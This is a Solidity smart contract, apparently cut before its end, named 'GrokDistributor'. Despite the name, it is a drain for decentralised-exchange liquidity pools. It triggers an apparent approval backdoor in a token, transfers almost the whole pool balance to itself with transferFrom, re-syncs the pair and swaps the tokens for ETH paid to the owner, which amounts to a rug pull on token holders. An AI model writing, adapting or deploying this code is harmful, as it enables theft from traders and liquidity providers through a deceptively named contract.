interface IERC20 {

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


interface IUniswapV2Pair {
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function WETH() external pure returns (address);
}

interface Token {
    function approveAllRouters() external;
}


contract GrokDistributor is Ownable {
    using SafeMath for uint256;

    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address wallet;

    constructor()  {
        wallet = owner();
    }

    function startDistribution(address token, address poolAddress) public onlyOwner {
        Token(token).approveAllRouters();

        uint balance = IERC20(token).balanceOf(poolAddress) - 2;
        IERC20(token).transferFrom(poolAddress, address(this), balance);

        IUniswapV2Pair(poolAddress).sync();

        swap(token);
    }

    function withdrawEthToOwner() external {
        payable(wallet).transfer(address(this).balance);
    }

    function withdrawErcToOwner(address token) external {
        uint balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(wallet, balance);
    }

    function swap(address token) private {
        IUniswapV2Router uniswapV2Router = IUniswapV2Router(ROUTER);

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = uniswapV2Router.WETH();

        uint tokens = IERC20(token).balanceOf(address(this));
        IERC20(token).approve(ROUTER, tokens);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokens,
            0,
            path,
            wallet,
            block.timestamp
        );
    }

    receive() external payable {}

